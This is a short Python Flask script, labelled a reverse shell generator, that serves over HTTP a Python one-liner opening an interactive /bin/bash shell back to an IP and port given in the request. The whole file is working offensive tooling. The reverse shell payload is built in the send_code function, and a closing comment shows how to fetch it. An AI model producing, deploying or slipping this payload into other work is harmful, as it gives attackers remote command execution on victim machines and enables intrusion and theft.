import flask,sys
#py rev shell generator via HTTP.
#requirements:
#on target system python3 interpreter must be installed

IP=sys.argv[1]
PORT=sys.argv[2]
app=flask.Flask(__name__)
@app.route('/shell',methods=['GET'])
def send_code():
 s=flask.request.args.get('ip',type=str)
 p=flask.request.args.get('port')
 python_rev_shell=f'import socket,os,subprocess; sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);os.dup2(sk.fileno(),0);os.dup2(sk.fileno(),1);os.dup2(sk.fileno(),2); sk.connect(("{s}",{int(p)})); subprocess.run(["/bin/bash","-i"],text=True);'
 return python_rev_shell


app.run(host=IP,port=PORT)

# http req should be made to http://IP:PORT/shell?ip=[ip_addr]&port=[port_addr]
